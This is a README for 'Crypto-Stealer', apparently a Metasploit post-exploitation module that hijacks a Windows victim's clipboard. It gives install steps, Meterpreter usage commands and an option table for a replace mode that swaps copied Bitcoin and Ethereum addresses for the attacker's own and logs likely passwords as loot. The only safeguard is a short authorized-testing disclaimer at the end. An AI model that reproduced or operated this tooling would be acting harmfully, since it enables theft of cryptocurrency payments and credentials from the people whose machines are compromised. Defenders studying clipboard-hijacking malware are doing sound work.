# Crypto-Stealer

Real-time clipboard monitoring and hijacking module for Metasploit.  
Detects and Swap cryptocurrency addresses and passwords on Windows targets.

---

## Install

```bash
mkdir -p ~/.msf4/modules/post/windows/gather/

# Save clipswap.rb to:
~/.msf4/modules/post/windows/gather/crypto-stealer.rb

msfconsole
msf6 > reload_all
```

---

## Usage

```text
1. Get a Meterpreter session on a Windows target
2. meterpreter > load extapi
3. meterpreter > background
4. msf6 > use post/windows/gather/clipswap
5. msf6 > set SESSION 1
6. msf6 > run
```

Press **Ctrl+C** to stop monitoring.

---

## Options

| Option | Default | Description |
|---------|---------|-------------|
| SESSION | - | Target Meterpreter session ID |
| REPLACE | false | Replace detected cryptocurrency addresses |
| BTC_ADDRESS | 1ReplaceBTCxxx | Bitcoin address to inject |
| ETH_ADDRESS | 0xReplaceETHxxx | Ethereum address to inject |
| INTERVAL | 2 | Clipboard polling interval (seconds) |
| LOG_TO_FILE | true | Save captured data to a Metasploit loot file |

---

## Replace Mode

```bash
msf6 > use post/windows/gather/clipswap
msf6 post(windows/gather/clipswap) > set SESSION 1
msf6 post(windows/gather/clipswap) > set REPLACE true
msf6 post(windows/gather/clipswap) > set BTC_ADDRESS 1YourBTCaddress
msf6 post(windows/gather/clipswap) > set ETH_ADDRESS 0xYourETHaddress
msf6 post(windows/gather/clipswap) > run
```

---

## Detects

- Bitcoin (BTC) addresses
- Ethereum (ETH) addresses
- Potential passwords (12+ characters with mixed case and numbers)

---

## Requirements

- Windows target with an active Meterpreter session
- `extapi` extension loaded:

```text
meterpreter > load extapi
```

---

## Disclaimer

This module is intended **solely for authorized security testing, research, and defensive assessments**. Only use it on systems for which you have explicit permission. Unauthorized access, credential collection, or clipboard manipulation may violate applicable laws and regulations.